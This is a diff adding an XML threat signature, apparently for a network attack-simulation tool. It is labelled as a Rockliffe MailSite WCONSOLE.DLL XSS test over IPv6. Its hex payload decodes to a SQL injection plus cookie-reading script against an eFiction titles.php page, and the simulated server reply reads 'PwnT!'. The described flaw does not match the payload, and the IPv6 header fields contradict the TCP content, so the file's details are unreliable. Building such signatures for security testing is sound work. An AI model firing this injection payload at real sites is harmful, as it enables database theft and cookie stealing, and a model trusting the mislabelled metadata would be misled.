@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value=" Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Corruption"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Rockliffe"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Rockliffe_Mailsite"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Rockliffe_Mailsite_6.1.22"/>
+      <item value="Rockliffe_Mailsite_5.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.secunia.com/advisories/18551"/>
+    <CVEID display="true" value="CVE-2006-0341"/>
+    <bugtraqID display="true" value="16330"/>
+    <OSVDB display="true" value="22677"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="c49928f019dbf06935f32eeec84cf949"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236796380"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1141448909" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="504F5354202F6566696374696F6E2F7469746C65732E7068703F616374696F6E3D766965776C697374266C65743D27253230554E494F4E25323053454C454354253230302C302C273C7363726970743E616C65727428646F63756D656E742E636F6F6B6965293C2F7363726970743E272C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C70656E6E616D652C3025323046524F4D25323066616E66696374696F6E5F617574686F72732532302F2A20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
